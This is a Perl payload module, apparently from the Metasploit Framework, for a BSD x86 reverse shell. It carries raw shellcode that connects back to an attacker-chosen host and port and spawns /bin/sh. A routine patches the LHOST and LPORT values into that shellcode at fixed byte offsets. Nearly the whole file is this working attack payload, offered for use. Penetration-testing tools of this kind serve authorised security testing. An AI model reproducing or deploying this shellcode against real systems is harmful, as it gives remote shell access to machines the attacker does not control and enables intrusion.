package Msf::Payload::bsdx86_reverse;
use strict;
use base 'Msf::Payload';

my $info =
{
    Name         => 'bsdx86reverse',
    Version      => '1.0',
    Description  => 'Connect back to attacker and spawn a shell',
    Author       => 'root[at]marcetam.net [Unknown License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'bsd' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'reverse_shell',
    Size         => '',
    UserOpts     =>
        {
            'LHOST' => [1, 'ADDR', 'Local address to receive connection'],
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate
{
    my $self = shift;
    my $host = shift;
    my $port = shift;
    my $off_host = 10;
    my $off_port = 18;
    
    my $shellcode = # bsd reverse connect by root[at]marcetam.net
    "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\xaa\xbb\xcc\xdd\xcd\x80".
    "\x66\x68\xbb\xaa\x66\x52\x89\xe6\x6a\x10\x56\x50\x50\xb0\x62\xcd".
    "\x80\x5b\xb0\x5a\x52\x53\x52\x4a\xcd\x80\x7d\xf6\x68\x6e\x2f\x73".
    "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";

    my $host_bin = gethostbyname($host);
    my $port_bin = pack("n", $port);

    substr($shellcode, $off_host, 4, $host_bin);
    substr($shellcode, $off_port, 2, $port_bin);
    
    # $shellcode = "\x81\xc4\x00\xfe\xff\xff" . $shellcode;
    return $shellcode;
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('127.0.0.1', '4444');
    return length($bin);
}
